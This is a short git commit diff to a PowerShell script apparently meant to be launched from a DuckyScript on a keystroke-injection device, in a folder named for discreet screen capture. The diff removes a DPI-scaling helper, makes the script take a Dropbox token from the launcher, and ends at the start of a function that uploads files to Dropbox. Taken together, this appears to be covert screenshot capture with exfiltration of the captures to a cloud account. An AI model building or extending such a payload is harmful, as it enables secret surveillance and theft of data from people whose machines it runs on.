984e5141aeeaf0039c88bec2f2d7512c4ecc7d2f
flippermen <99625153+dolaraso@users.noreply.github.com>
2024-10-08 12:53:08 -0500

    br

--- captura de pantalla discreta/captura.ps1
+++ captura de pantalla discreta/captura.ps1
@@ -1,30 +1,8 @@
-Add-Type @'
-using System;
-using System.Runtime.InteropServices;
-using System.Drawing;
-
-public class DPI {
-  [DllImport("gdi32.dll")]
-  static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
-
-  public enum DeviceCap {
-  VERTRES = 10,
-  DESKTOPVERTRES = 117
-  }
-
-  public static float scaling() {
-  Graphics g = Graphics.FromHwnd(IntPtr.Zero);
-  IntPtr desktop = g.GetHdc();
-  int LogicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.VERTRES);
-  int PhysicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.DESKTOPVERTRES);
-
-  return (float)PhysicalScreenHeight / (float)LogicalScreenHeight;
-  }
+# El token de Dropbox es proporcionado al script como variable $db desde el DuckyScript
+if (-not $db) {
+    Write-Host "Token de Dropbox no encontrado, deteniendo el script."
+    exit
 }
-'@ -ReferencedAssemblies 'System.Drawing.dll' -ErrorAction Stop
-
-# Introduce tu token de acceso a continuación.
-$db = "TU_TOKEN_DE_DROPBOX"
 
 # Función para subir archivos a Dropbox
 function Upload-ToDropbox {
